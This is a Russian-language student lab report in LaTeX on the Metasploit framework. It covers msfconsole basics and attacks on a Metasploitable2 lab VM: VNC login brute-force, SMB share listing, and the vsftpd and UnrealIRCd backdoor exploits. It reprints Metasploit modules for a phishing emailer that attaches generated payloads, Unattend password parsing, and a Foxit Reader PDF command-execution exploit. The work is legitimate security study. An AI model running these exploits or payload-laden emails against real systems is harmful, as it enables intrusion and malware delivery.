%----------------------------------------------------------------------------------------
%	PACKAGES AND DOCUMENT CONFIGURATIONS
%----------------------------------------------------------------------------------------

\documentclass[10pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage{graphicx} % Required for the inclusion of images
\graphicspath{{res2/}}
\usepackage{natbib} % Required to change bibliography style to APA
\usepackage{amsmath} % Required for some math elements 
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{listings}
\usepackage{float}

\usepackage[T1,T2A]{fontenc}

\setlength\parindent{0pt} % Removes all indentation from paragraphs

\renewcommand{\labelenumi}{\alph{enumi}.} % Make numbering in the enumerate environment by letter rather than number (e.g. section 6)

%----------------------------------------------------------------------------------------
%	DOCUMENT INFORMATION
%----------------------------------------------------------------------------------------

\title{Инструмент тестов на проникновение Metasploit} % Title

\author{Виктор \textsc{Борисов}} % Author name

\begin{document}

\maketitle % Insert the title, author and date

\newpage

\tableofcontents

\newpage

%----------------------------------------------------------------------------------------
%	SECTION 1
%----------------------------------------------------------------------------------------

\section{Цель работы}

Изучить инструмент тестов на проникновение Metasploit и научиться работать с некоторыми возможностями.

%----------------------------------------------------------------------------------------
%	SECTION 2
%----------------------------------------------------------------------------------------

\section{Ход работы}

\subsection{Изучение}
\label{theory}

\subsubsection{Структура}

Главной составляющей Metasploit является библиотека Rex. Она требуется для операций общего назначения: работы с сокетами, протоколами, форматирования текста, работы с кодировками и подобных. На ней базируется библиотека MSF Core, которая предоставляет базовый функционал и «низкоуровневый» API. Его использует библиотека MSF Base, которая, в свою очередь, предоставляет API для плагинов, интерфейса пользователя и модулей. Модули делятся на несколько типов, в зависимости от предоставляемой функциональности:
\begin{itemize}
\item Exploit — код, эксплуатирующий определенную уязвимость на целевой системе (например, переполнение буфера);
\item Payload — код, который запускается на целевой системе после того, как отработал эксплойт (устанавливает соединение, выполняет шелл-скрипт и прочее);
\item Post — код, который запускается на системе после успешного проникновения (например, собирает пароли, скачивает файлы);
\item Encoder — инструменты для обфускации модулей с целью маскировки от антивирусов;
\item NOP — генераторы NOP’ов. Это ассемблерная инструкция, которая не производит никаких действий. Используется, чтобы заполнять пустоту в исполняемых файлах, для подгонки под необходимый размер;
\item Auxiliary — модули для сканирования сети, анализа трафика и так далее;
\item Shellcode — Шеллкод. Используется как полезная нагрузка эксплойта, обеспечивающая доступ к командной оболочке ОС.
\end{itemize}

\subsubsection{Запуск msfconsole и получение списка допустимых команд (help)}

\begin{figure}[H]
\begin{center}
\includegraphics[width=0.65\textwidth]{msf_start}
\caption{Запуск msfconsole.}
\end{center}
\end{figure}

После запуска msfconsole для получения доступных команд необходимо ввести команду help.

\begin{figure}[h!]
\begin{center}
\includegraphics[width=0.65\textwidth]{msf_help_1}
\caption{Команды msfconsole.}
\label{fig:msf_help1}
\end{center}
\end{figure}

\begin{figure}[h!]
\begin{center}
\includegraphics[width=0.65\textwidth]{msf_help_2}
\caption{Команды msfconsole.}
\label{fig:msf_help2}
\end{center}
\end{figure}

\subsubsection{Базовые команды}
Рассмотрим основные команды msfconsole
\begin{itemize}
\item use — выбрать определенный модуль для работы с ним;
\item back — операция, обратная use: перестать работать с выбранным модулем и вернуться назад;
\item show — вывести список модулей определенного типа;
\item set— установить значение определенному объекту;
\item run — запустить вспомогательный модуль после того, как были установлены необходимые опции;
\item info — вывести информацию о модуле;
\item search — найти определенный модуль;
\item check — проверить, подвержена ли целевая система уязвимости;
\item sessions — вывести список доступных сессий.
\end{itemize}

\subsubsection{Команды по работе с эксплойтом}
\begin{itemize}
\item show exploits - получение списка всех доступных эксплоитов.
\item show options - получение списка опций, которые можно использовать. Каждый эксплоит или payload имеет свой собственный набор опций, который можно использовать при работе с ними.
\item exploit - запускает эксплоит. Есть другая версия этой команды - rexploit, которая перезагружает код запущенного эксплоита и запускает его вновь.
\item set RHOST <hostname\_or\_ip> - указываем этой командой Metasploit определенный хост в сети для его изучения. Хост можно задать как по его имени и по IP-адресу.
\item set RPORT <host\_port> - задает для Metasploit порт удаленной машины, по которому фреймворк должен подключиться к указанному хосту
\item set payload <generic/shell\_bind\_tcp> - команда указывает имя payload’а, который будет использоваться.
\end{itemize}

\subsubsection{Команды по работе с БД}
\begin{itemize}
\item db\_connect - подключение к БД.
\item db\_status - проверка состояния БД.
\item db\_host - просмотр списка хостов в файле БД.
\item db\_del\_host - удаление хоста из БД.
\item db\_rebuild\_cache - пересборка кэша.
\end{itemize}

\subsubsection{GUI оболочка Armitage}
Armitage - графическая оболочка для фреймворка Metasploit. С помощью нее можно представлять хосты-цели в визуальном режиме, получать подсказки о рекомендуемых эксплоитах в каждом конкретном случае. Для опытных пользователей Armitage предлагает возможности удаленного управления и совместной работы с Metasploit.

Запустим и протестируем работу Armitage. При запуске оставляем параметры по умолчанию.

\begin{figure}[h!]
\begin{center}
\includegraphics[width=0.65\textwidth]{armitage_1}
\caption{Armitage.}
\label{fig:armitage}
\end{center}
\end{figure}

\subsubsection{GUI веб-клиент}
Не удалось запустить msfweb на данной версии ОС Kali Linux 4.3 с metasploit v4.11.7-

\subsection{Подключение к VNC-серверу, получение доступа к консоли}
Изучим ОС metasploitable2 на уязвимости с помощью команды.\\
\begin{verbatim}
nmap -sV 192.168.100.8
\end{verbatim}

\begin{figure}[h!]
\begin{center}
\includegraphics[width=0.65\textwidth]{nmap_scan}
\caption{Сканирование с помощью nmap.}
\label{fig:nmap}
\end{center}
\end{figure}

VNC использует порт 5900. Название сервиса VNC (protocol 3.3).

Пытаемся найти эксплойты
\begin{verbatim}
search "VNC (protocol 3.3)
\end{verbatim}

\begin{figure}[h!]
\begin{center}
\includegraphics[width=0.65\textwidth]{search_vnc}
\caption{Результат поиска}
\label{fig:search_vnc}
\end{center}
\end{figure}

Настраиваем и запускаем эксплоит
\begin{verbatim}
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.100.8
exploit
\end{verbatim}

\begin{figure}[h!]
\centering
\includegraphics[width=\textwidth]{vnc_login}
\caption{Результат работы vnc\_login}
\end{figure}

Теперь, зная пароль, с помощью TightVNC подключаемся к атакуемому компьютеру.
\begin{figure}[h!]
\centering
\includegraphics[width=\textwidth]{vnc_connected}
\caption{Подключение к атакуемому компьютеру}
\end{figure}

\newpage
\subsection{Получение списка директорий в общем доступе по протоколу SMB}
Получить список директорий в общем доступе по протоколу SMB можно с помощью smb\_enumshares.\\
Настраиваем и запускаем эксплоит
\begin{verbatim}
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.100.8
set THREADS 2
run
\end{verbatim}

\begin{figure}[h!]
\centering
\includegraphics[width=\textwidth]{smb_enumshares}
\caption{Результат работы smb\_enumshares.}
\end{figure}

Получили список директорий, находящихся в общем доступе.

\subsection{Получение консоли с использованием уязвимости в vsftpd}
Для данной уязвимости воспользуемся готовым эксплоитом vsftpd\_234\_backdoor.
Настраиваем и запускаем эксплоит
\begin{verbatim}
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.100.8
exploit
\end{verbatim}

\begin{figure}[h!]
\centering
\includegraphics[width=\textwidth]{vsftpd}
\caption{Результат работы vsftpd\_234\_backdoor.}
\end{figure}

Доступ получен, попробуем выполнить любую команду, например, uname.

\subsection{Получение консоли с использованием уязвимости в irc}
Для данной уязвимости воспользуемся готовым эксплоитом unreal\_ircd\_3281\_backdoor.
Настраиваем и запускаем эксплоит
\begin{verbatim}
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST 192.168.100.8
exploit
\end{verbatim}

\begin{figure}[h!]
\centering
\includegraphics[width=\textwidth]{ircd}
\caption{Результат работы  unreal\_ircd\_3281\_backdoor.}
\end{figure}

Доступ получен, попробуем выполнить любую команду, например, uname.

\subsection{Armitage Hail Mary}
Armitage Hail Mary предназначен для применения всех эксплоитов к заданному хосту

\begin{figure}[H]
\centering
\includegraphics[width=\textwidth]{hail_mary_1}
\caption{Процесс сканирования.}
\end{figure}

\begin{figure}[H]
\centering
\includegraphics[width=\textwidth]{hail_mary_2}
\caption{Результат сканирования Hail Mary.}
\end{figure}

\subsection{Изучить три файла с исходным кодом эксплойтов или служебных скриптов на ruby и описать, что в них происходит}

Файлы находятся в директории /usr/share/metasploit-framework/modules.
Структура файлов примерно одинакова:
\begin{itemize}
\item{Зависимости}
\item{Класс}
\end{itemize}
В каждом классе обязательно наличие метода initialize(), в который происходит инициализация.


\subsubsection{client/smtp/emailer.rb}

Предназначен для автоматизированной отправки сообщений электронной почты по протоколу smtp.


\begin{verbatim}
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'yaml'


class Metasploit3 < Msf::Auxiliary

  #
  # This module sends email messages via smtp
  #
  include Msf::Exploit::Remote::SMTPDeliver
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Generic Emailer (SMTP)',
      'Description'    => %q{
          This module can be used to automate email delivery.
        This code is based on Joshua Abraham's email script for social
        engineering.
      },
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://spl0it.org/' ],
        ],
      'Author'         => [ 'et <et[at]metasploit.com>' ]))

      register_options(
        [
          OptString.new('RHOST', [true, "SMTP server address",'127.0.0.1']),
          OptString.new('RPORT', [true, "SMTP server port",'25']),
          OptString.new('YAML_CONFIG', [true, "Full path to YAML Configuration file",
            File.join(Msf::Config.data_directory,"emailer_config.yaml")]),
        ], self.class)

    # Hide this option from the user
    deregister_options('MAILTO')
    deregister_options('SUBJECT')
  end

  def load_yaml_conf
    opts = {}

    File.open(datastore['YAML_CONFIG'], "rb") do |f|
      yamlconf = YAML::load(f)

      opts['to']                   = yamlconf['to']
      opts['from']                 = yamlconf['from']
      opts['subject']              = yamlconf['subject']
      opts['type']                 = yamlconf['type']
      opts['msg_file']             = yamlconf['msg_file']
      opts['wait']                 = yamlconf['wait']
      opts['add_name']             = yamlconf['add_name']
      opts['sig']                  = yamlconf['sig']
      opts['sig_file']             = yamlconf['sig_file']
      opts['attachment']           = yamlconf['attachment']
      opts['attachment_file']      = yamlconf['attachment_file']
      opts['attachment_file_type'] = yamlconf['attachment_file_type']
      opts['attachment_file_name'] = yamlconf['attachment_file_name']

      ### payload options ###
      opts['make_payload']         = yamlconf['make_payload']
      opts['zip_payload']          = yamlconf['zip_payload']
      opts['msf_port']             = yamlconf['msf_port']
      opts['msf_ip']               = yamlconf['msf_ip']
      opts['msf_payload']          = yamlconf['msf_payload']
      opts['msf_filename']         = yamlconf['msf_filename']
      opts['msf_change_ext']       = yamlconf['msf_change_ext']
      opts['msf_payload_ext']      = yamlconf['msf_payload_ext']
    end

    opts
  end

  def load_file(fname)
    buf = ''
    File.open(fname, 'rb') do |f|
      buf = f.read
    end

    buf
  end

  def run

    yamlconf = load_yaml_conf

    fileto               = yamlconf['to']
    from                 = yamlconf['from']
    subject              = yamlconf['subject']
    type                 = yamlconf['type']
    msg_file             = yamlconf['msg_file']
    wait                 = yamlconf['wait']
    add_name             = yamlconf['add_name']
    sig                  = yamlconf['sig']
    sig_file             = yamlconf['sig_file']
    attachment           = yamlconf['attachment']
    attachment_file      = yamlconf['attachment_file']
    attachment_file_type = yamlconf['attachment_file_type']
    attachment_file_name = yamlconf['attachment_file_name']

    make_payload         = yamlconf['make_payload']
    zip_payload          = yamlconf['zip_payload']
    msf_port             = yamlconf['msf_port']
    msf_ip               = yamlconf['msf_ip']
    msf_payload          = yamlconf['msf_payload']
    msf_filename         = yamlconf['msf_filename']
    msf_change_ext       = yamlconf['msf_change_ext']
    msf_payload_ext      = yamlconf['msf_payload_ext']

    tmp = Dir.tmpdir

    datastore['MAILFROM'] = from

    msg       = load_file(msg_file)
    email_sig = load_file(sig_file)

    if (type !~ /text/i and type !~ /text\/html/i)
      print_error("YAML config: #{type}")
    end

    if make_payload
      attachment_file = File.join(tmp, msf_filename)
      attachment_file_name = msf_filename

      print_status("Creating payload...")
      mod = framework.payloads.create(msf_payload)
      if (not mod)
        print_error("Failed to create payload, #{msf_payload}")
        return
      end

      # By not passing an explicit encoder, we're asking the
      # framework to pick one for us.  In general this is the best
      # way to encode.
      buf = mod.generate_simple(
          'Format'  => 'raw',
          'Options' => { "LHOST"=>msf_ip, "LPORT"=>msf_port }
        )
      exe = generate_payload_exe({
          :code => buf,
          :arch => mod.arch,
          :platform => mod.platform
        })

      print_status("Writing payload to #{attachment_file}")
      # XXX If Rex::Zip will let us zip a buffer instead of a file,
      # there's no reason to write this out
      File.open(attachment_file, "wb") do |f|
        f.write(exe)
      end

      if msf_change_ext
        msf_payload_newext = attachment_file
        msf_payload_newext = msf_payload_newext.sub(/\.\w+$/, ".#{msf_payload_ext}")
        File.rename(attachment_file, msf_payload_newext)
        attachment_file = msf_payload_newext
      end

      if zip_payload
        zip_file = attachment_file.sub(/\.\w+$/, '.zip')
        system("zip -r #{zip_file} #{attachment_file}> /dev/null 2>&1");
        attachment_file      = zip_file
        attachment_file_type = 'application/zip'
      else
        attachment_file_type = 'application/exe'
      end

    end


    File.open(fileto, 'rb').each do |l|
      next if l !~ /\@/

      nem = l.split(',')
      name = nem[0].split(' ')
      fname = name[0]
      lname = name[1]
      email = nem[1]


      if add_name
        email_msg_body = "#{fname},\n\n#{msg}"
      else
        email_msg_body = msg
      end

      if sig
        data_sig = load_file(sig_file)
        email_msg_body = "#{email_msg_body}\n#{data_sig}"
      end

      print_status("Emailing #{name[0]} #{name[1]} at #{email}")

      mime_msg = Rex::MIME::Message.new
      mime_msg.mime_defaults

      mime_msg.from = from
      mime_msg.to = email
      datastore['MAILTO'] = email.strip
      mime_msg.subject = subject

      mime_msg.add_part(Rex::Text.encode_base64(email_msg_body, "\r\n"), type, "base64", "inline")

      if attachment
        if attachment_file_name
          data_attachment = load_file(attachment_file)
          mime_msg.add_part(Rex::Text.encode_base64(data_attachment, "\r\n"), attachment_file_type, "base64", "attachment; filename=\"#{attachment_file_name}\"")
        end
      end

      send_message(mime_msg.to_s)
      select(nil,nil,nil,wait)
    end

    print_status("Email sent..")
  end

end
\end{verbatim}

Из конфигурационного yaml файла читаются необходимые инициализационные параметры, а так же список параметров для писем.
Далее подготавливается каждое письмо (заполня.тся данные об адресате, теме, содержании, вложении и пр.) и происходит отправка.


\subsubsection{parser/unattend.rb}

Предназначен для парсинга Unattend файлов в заданной директории.


\begin{verbatim}
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/parser/unattend'

class Metasploit3 < Msf::Auxiliary

  def initialize(info={})
    super( update_info( info,
        'Name'        => 'Auxilliary Parser Windows Unattend Passwords',
        'Description' => %q{
        This module parses Unattend files in the target directory.

        See also: post/windows/gather/enum_unattend
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Ben Campbell',
        ],
      'References'    =>
        [
          ['URL', 'http://technet.microsoft.com/en-us/library/ff715801'],
          ['URL', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx'],
          ['URL', 'http://technet.microsoft.com/en-us/library/c026170e-40ef-4191-98dd-0b9835bfa580']
        ],
    ))

    register_options([
      OptPath.new('PATH', [true, 'Directory or file to parse.']),
      OptBool.new('RECURSIVE', [true, 'Recursively check for files', false]),
    ])
  end

  def run
    if datastore['RECURSIVE']
      ext = "**/*.xml"
    else
      ext = "/*.xml"
    end

    if datastore['PATH'].ends_with('.xml')
      filepath = datastore['PATH']
    else
      filepath = File.join(datastore['PATH'], ext)
    end

    Dir.glob(filepath) do |item|
      print_status "Processing #{item}"
      file = File.read(item)
      begin
        xml = REXML::Document.new(file)
      rescue REXML::ParseException => e
        print_error("#{item} invalid xml format.")
        vprint_line(e.message)
        next
      end

      results = Rex::Parser::Unattend.parse(xml)
      table = Rex::Parser::Unattend.create_table(results)
      print_line table.to_s unless table.nil?
      print_line
    end
  end
end

\end{verbatim}

Парсит Unattend файлы в формате xml в заданной дирректории с помощью функции Rex::Parser::Unattend.parse.

\subsubsection{pdf/foxit/authbypass.rb}

Использует уязвимость в Foxit Reader build 1120 для запуска exe файлов без необходимости подтверждения со стороны жертвы.

\begin{verbatim}
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Foxit Reader Authorization Bypass',
      'Description'    => %q{
          This module exploits a authorization bypass vulnerability in Foxit Reader
        build 1120. When a attacker creates a specially crafted pdf file containing
        a Open/Execute action, arbitrary commands can be executed without confirmation
        from the victim.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'MC', 'Didier Stevens <didier.stevens[at]gmail.com>', ],
      'References'     =>
        [
          [ 'CVE', '2009-0836' ],
          [ 'OSVDB', '55615'],
          [ 'BID', '34035' ],
        ],
      'DisclosureDate' => 'Mar 9 2009',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('CMD',        [ false, 'The command to execute.', '/C/Windows/System32/calc.exe']),
        OptString.new('FILENAME',   [ false, 'The file name.',  'msf.pdf']),
        OptString.new('OUTPUTPATH', [ false, 'The location of the file.',  './data/exploits/']),
      ], self.class)

  end

  def run
    exec = datastore['CMD']

    # Create the pdf
    pdf = make_pdf(exec)

    print_status("Creating '#{datastore['FILENAME']}' file...")

    file_create(pdf)
  end

  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
  def n_obfu(str)
    result = ""
    str.scan(/./u) do |c|
      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
        result << "#%x" % c.unpack('C*')[0]
      else
        result << c
      end
    end
    result
  end

  def random_non_ascii_string(count)
    result = ""
    count.times do
      result << (rand(128) + 128).chr
    end
    result
  end

  def io_def(id)
    "%d 0 obj" % id
  end

  def io_ref(id)
    "%d 0 R" % id
  end

  def make_pdf(exec)

    xref = []
    eol = "\x0d\x0a"
    endobj = "endobj" << eol

    # Randomize PDF version?
    pdf = "%%PDF-%d.%d" % [1 + rand(2), 1 + rand(5)] << eol
    pdf << "%" << random_non_ascii_string(4) << eol
    xref << pdf.length
    pdf << io_def(1) << n_obfu("<</Type/Catalog/Outlines ") << io_ref(2) << n_obfu("/Pages ") << io_ref(3) << n_obfu("/OpenAction ") << io_ref(5) << ">>" << endobj
    xref << pdf.length
    pdf << io_def(2) << n_obfu("<</Type/Outlines/Count 0>>") << endobj
    xref << pdf.length
    pdf << io_def(3) << n_obfu("<</Type/Pages/Kids[") << io_ref(4) << n_obfu("]/Count 1>>") << endobj
    xref << pdf.length
    pdf << io_def(4) << n_obfu("<</Type/Page/Parent ") << io_ref(3) << n_obfu("/MediaBox[0 0 612 792]>>") << endobj
    xref << pdf.length
    pdf << io_def(5) << "<</Type/Action/S/Launch/F << /F(#{exec})>>/NewWindow true\n" + io_ref(6) + ">>" << endobj
    xref << pdf.length
    pdf << endobj
    xrefPosition = pdf.length
    pdf << "xref" << eol
    pdf << "0 %d" % (xref.length + 1) << eol
    pdf << "0000000000 65535 f" << eol
    xref.each do |index|
      pdf << "%010d 00000 n" % index << eol
    end
    pdf << "trailer" << n_obfu("<</Size %d/Root " % (xref.length + 1)) << io_ref(1) << ">>" << eol
    pdf << "startxref" << eol
    pdf << xrefPosition.to_s() << eol
    pdf << "%%EOF" << eol

  end

end
\end{verbatim}

Создает pdf файл с необходимым для запуска содержанием.

\section{Выводы}
В ходе выполнения работы был изучен инструмент тестов на проникновение Metasploit, с его помощью были изучены способы поиска уязвимостей хостов, осуществления атак с использованием найденных уязвимостей. Данный инструмент полезен для получения общей картины уязвимости собственных хостов, что позволит закрыть "дыры" в безопасности.


%----------------------------------------------------------------------------------------
%	END
%----------------------------------------------------------------------------------------


\end{document}

